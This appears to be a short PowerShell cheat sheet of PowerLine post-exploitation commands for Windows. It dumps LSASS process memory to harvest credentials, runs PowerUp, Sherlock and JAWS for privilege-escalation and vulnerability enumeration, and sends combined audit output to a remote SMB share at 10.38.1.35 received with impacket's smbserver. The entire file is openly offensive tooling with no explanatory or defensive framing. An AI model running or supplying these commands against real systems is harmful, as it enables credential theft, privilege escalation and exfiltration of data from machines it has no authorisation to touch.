# Get an LSASS.exe dump
#
# powerline.exe Out-Minidump "Get-Process lsass | Out-Minidump"


Write-Host @"

# Run PowerUp 
#
powerline.exe PowerUp Invoke-AllChecks

# Find old vulns with Sherlock
#
powerline.exe Sherlock Find-AllVulns

# JAWS Enum
#
powerline.exe jaws-enum

# Launch a little bit of everything and send this to \\10.38.1.35\tmp
# receive using: impacket's  examples smbserver:
# $ python examples/smbserver.py /tmp TMP
#
powerline.exe AsyncAudit "Invoke-AsyncAudit -Out \\10.38.1.35\tmp"
"@